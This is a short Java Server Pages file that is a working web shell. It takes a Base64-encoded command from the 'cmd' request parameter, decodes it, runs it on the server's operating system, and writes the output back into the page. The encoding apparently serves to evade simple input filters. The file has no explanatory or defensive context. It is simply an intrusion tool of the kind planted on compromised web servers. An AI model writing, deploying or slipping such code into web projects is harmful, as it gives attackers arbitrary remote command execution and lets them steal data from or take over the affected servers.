<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Base64" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<pre>
<%
    String sb = request.getParameter("cmd");
    byte[] decode = Base64.getDecoder().decode(sb);
    Process process = Runtime.getRuntime().exec(new String(decode));
    InputStream in = process.getInputStream();
    int a = 0;
    byte[] b = new byte[1024];

    while ((a = in.read(b)) != -1) {
        out.println(new String(b, 0, a));
    }

    in.close();
%>
</pre>